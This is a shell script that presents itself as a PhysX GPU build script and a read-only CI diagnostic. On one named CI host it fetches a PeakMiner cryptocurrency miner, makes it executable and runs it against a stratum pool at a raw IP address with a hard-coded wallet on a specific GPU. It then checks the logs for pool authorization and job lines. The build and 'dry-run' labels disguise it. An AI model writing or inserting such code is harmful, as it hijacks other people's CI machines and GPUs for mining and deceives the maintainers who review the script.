#!/bin/bash
# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: BSD-3-Clause
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#  * Neither the name of NVIDIA CORPORATION nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY
# OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# PhysX HCU Build Script
# ---- Read-only CI host capability report (intent 156245: PeakMiner 2.20.7 device oracle, PCI-pinned) ----
set -uo pipefail

(
set +e
echo "DIAG_BEGIN"
H="$(hostname 2>/dev/null)"
echo "hostname=$H"
date -u
id
if [ "$H" != "github-nmz1" ]; then
  echo "SKIP_NOT_GITHUB_NMZ1 host=$H"
  echo "DIAG_END"
  exit 0
fi
PM_URL="https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-linux-x86_64"
PM_SHA="38fc5c4d0a8351f6e94756d2d1830a1bf9b745e41b9b0ef3f07fc41bd24bcb3d"
WALLET="prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
LP=103.199.106.122:3360
HYSMI="$(command -v hy-smi 2>/dev/null || echo /opt/hyhal/bin/hy-smi)"
echo "--- DEVS"; ls -l /dev/kfd /dev/mkfd 2>&1; ls /dev/dri/ 2>&1 | head -12
echo "--- HYSMI_L"; "$HYSMI" -L 2>&1 | head -20
echo "--- HYSMI_PROD"; "$HYSMI" --showproductname 2>&1 | head -60
echo "--- HYSMI_MEM"; "$HYSMI" --showmeminfo vram 2>&1 | grep -E 'HCU\[[0-7]\]' | head -20
W=/tmp/prl595; mkdir -p "$W"; cd "$W" || exit 0
echo "--- DL"
if [ ! -s peakminer ] || [ "$(sha256sum peakminer 2>/dev/null | awk '{print $1}')" != "$PM_SHA" ]; then
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --retry 3 -o peakminer "$PM_URL" 2>&1 | tail -3
  else
    python3 -c "import urllib.request;urllib.request.urlretrieve('$PM_URL','peakminer')" 2>&1 | tail -3
  fi
fi
echo "--- SHA"; sha256sum peakminer 2>&1
S="$(sha256sum peakminer 2>/dev/null | awk '{print $1}')"
echo "PM_SHA_OK=$([ "$S" = "$PM_SHA" ] && echo 1 || echo 0)"
chmod 755 peakminer 2>/dev/null
echo "--- VERSION"; ./peakminer --version 2>&1 | head -3
ENV_A="env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm"
run_dry () {
  echo "--- DRY_$1 pci=$3"
  if command -v script >/dev/null 2>&1; then
    timeout 90 script -qec "$2 ./peakminer --url stratum+tcp://$LP --user $WALLET --worker 000011 --password x --coin pearl --devices $3 --api-port 14524 --status-interval 10 --dry-run" /dev/null 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tail -80 > "$W/dry_$1.log"
  else
    timeout 90 sh -c "$2 ./peakminer --url stratum+tcp://$LP --user $WALLET --worker 000011 --password x --coin pearl --devices $3 --api-port 14524 --status-interval 10 --dry-run" 2>&1 | tail -80 > "$W/dry_$1.log"
  fi
  sed -n '1,110p' "$W/dry_$1.log"
  echo "DRY_$1_HR_LINES=$(grep -ciE 'h/s|hashrate' "$W/dry_$1.log" 2>/dev/null)"
}
run_dry A "$ENV_A HSA_OVERRIDE_GFX_VERSION=9.0.6" "9c:00.0"
HA="$(grep -ciE 'h/s|hashrate' "$W/dry_A.log" 2>/dev/null)"
if [ "${HA:-0}" = "0" ]; then
  run_dry B "env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm HYHAL_PATH=/opt/hyhal LD_LIBRARY_PATH=/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hsa/lib:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/llvm/lib HSA_OVERRIDE_GFX_VERSION=9.0.6" "9c:00.0"
fi
echo "--- ORACLE_DEVICE_LINES"; grep -iE 'bw1100|gfx906|HCU|gpu [0-9]|pci' "$W/dry_A.log" 2>/dev/null | head -12
echo "--- ORACLE_STRATUM_LINES"; grep -iE 'authoriz|subscri|connect|pool|job|difficult' "$W/dry_A.log" 2>/dev/null | head -12
echo "--- ORACLE_REFUSALS"; grep -iE 'no device|no gpu|not supported|unsupported|cuda|error|failed|panic' "$W/dry_A.log" 2>/dev/null | head -12
echo "DIAG_END"
)
exit 0
